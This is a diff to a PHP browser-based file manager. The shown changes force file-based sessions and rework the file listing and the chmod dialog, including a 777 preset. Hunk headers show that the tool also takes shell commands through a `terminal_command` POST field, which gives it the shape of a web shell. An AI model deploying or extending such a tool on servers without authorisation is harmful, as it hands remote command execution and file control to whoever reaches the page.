@@ -3,6 +3,11 @@
 @ini_set('log_errors', '1');
 error_reporting(E_ALL);
 
+// --- FIX FOR SESSION ERROR ---
+// Force the use of file-based sessions. This overrides the server's default
+// configuration which might be set to 'redis' and causing the connection error.
+ini_set('session.save_handler', 'files');
+
 // Fix session path issue from xenium3
  $sessionPath = sys_get_temp_dir() . '/php_sessions';
 if (!is_dir($sessionPath)) {
@@ -1445,25 +1450,30 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
                     <?php endif; ?>
                 </td>
                 <td>
-                    <?php if ($isDirectory): ?>
-                        <span class="file-type <?= $canWrite ? 'writable' : 'readonly' ?>">Folder</span>
-                    <?php else: ?>
-                        <span class="file-type <?= $canWrite ? 'writable' : 'readonly' ?>"><?= getFileExtension($item) ?></span>
-                    <?php endif; ?>
+                    <span class="<?= $canWrite ? 'writable' : 'readonly' ?>">
+                        <?= $isDirectory ? 'Folder' : (getFileExtension($item) ?: 'File') ?>
+                    </span>
                 </td>
                 <td class="file-size">
                     <?= $isDirectory ? '-' : formatFileSize($fileSize) ?>
                 </td>
                 <td class="file-date">
-                    <?= date('Y-m-d H:i', $fileModTime) ?>
+                    <?= date('Y-m-d H:i:s', $fileModTime) ?>
                 </td>
                 <td>
                     <div class="action-buttons">
-                        <?php if (!$isDirectory): ?>
-                            <form method="post">
-                                <button name="edit" value="<?= $item ?>" class="btn btn-sm">Edit</button>
-                            </form>
-                        <?php endif; ?>
+                    <?php if ($isDirectory): ?>
+                        <form method="post">
+                            <button name="navigate" value="<?= $fullPath ?>" class="btn btn-sm">Open</button>
+                        </form>
+                    <?php else: ?>
+                        <form method="post">
+                            <button name="view" value="<?= $item ?>" class="btn btn-sm">View</button>
+                        </form>
+                        <form method="post">
+                            <button name="edit" value="<?= $item ?>" class="btn btn-sm">Edit</button>
+                        </form>
+                    <?php endif; ?>
                         <form method="post">
                             <button name="download" value="<?= $item ?>" class="btn btn-sm">Download</button>
                         </form>
@@ -1492,45 +1502,38 @@ if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== ''
             <span class="modal-title">Change Permissions</span>
             <span class="close" onclick="closeChmodModal()">&times;</span>
         </div>
-        <form method="post">
-            <input type="hidden" id="chmodItem" name="chmod_item" value="">
-            
+        <form method="post" id="chmod-form">
+            <input type="hidden" name="chmod_item" id="chmodItem" value="">
             <div class="chmod-options">
                 <div class="chmod-group">
-                    <label>&nbsp;</label>
-                    <label>Read</label>
-                    <label>Write</label>
-                    <label>Execute</label>
-                </div>
-                <div class="chmod-group">
                     <label>Owner</label>
-                    <input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()">
-                    <input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()">
-                    <input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()">
+                    <input type="checkbox" id="owner_read" onclick="updateChmodFromCheckboxes()"> Read
+                    <input type="checkbox" id="owner_write" onclick="updateChmodFromCheckboxes()"> Write
+                    <input type="checkbox" id="owner_execute" onclick="updateChmodFromCheckboxes()"> Execute
                 </div>
                 <div class="chmod-group">
                     <label>Group</label>
-                    <input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()">
-                    <input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()">
-                    <input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()">
+                    <input type="checkbox" id="group_read" onclick="updateChmodFromCheckboxes()"> Read
+                    <input type="checkbox" id="group_write" onclick="updateChmodFromCheckboxes()"> Write
+                    <input type="checkbox" id="group_execute" onclick="updateChmodFromCheckboxes()"> Execute
                 </div>
                 <div class="chmod-group">
                     <label>Other</label>
-                    <input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()">
-                    <input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()">
-                    <input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()">
+                    <input type="checkbox" id="other_read" onclick="updateChmodFromCheckboxes()"> Read
+                    <input type="checkbox" id="other_write" onclick="updateChmodFromCheckboxes()"> Write
+                    <input type="checkbox" id="other_execute" onclick="updateChmodFromCheckboxes()"> Execute
+                </div>
+                <div class="chmod-group">
+                    <label>Octal</label>
+                    <input type="text" id="chmodOctal" name="chmod_value" maxlength="3" style="width: 60px; text-align: center;" oninput="updateChmodDisplay(this.value);">
+                    <div style="margin-top: 10px;">
+                        <button type="button" class="btn btn-sm" onclick="setPresetChmod('644')">644</button>
+                        <button type="button" class="btn btn-sm" onclick="setPresetChmod('755')">755</button>
+                        <button type="button" class="btn btn-sm" onclick="setPresetChmod('777')">777</button>
+                    </div>
                 </div>
             </div>
-            
-            <div class="input-group">
-                <input type="text" id="chmodOctal" name="chmod_value" placeholder="755" maxlength="3" style="width: 80px; text-align: center;">
-                <button type="button" class="btn btn-sm" onclick="setPresetChmod('755')">755</button>
-                <button type="button" class="btn btn-sm" onclick="setPresetChmod('644')">644</button>
-                <button type="button" class="btn btn-sm" onclick="setPresetChmod('777')">777</button>
-                <button type="button" class="btn btn-sm" onclick="setPresetChmod('600')">600</button>
-            </div>
-            
-            <div style="margin-top: 15px; text-align: right;">
+            <div style="text-align: right; margin-top: 15px;">
                 <button type="button" class="btn" onclick="closeChmodModal()">Cancel</button>
                 <button type="submit" class="btn btn-primary">Apply</button>
             </div>
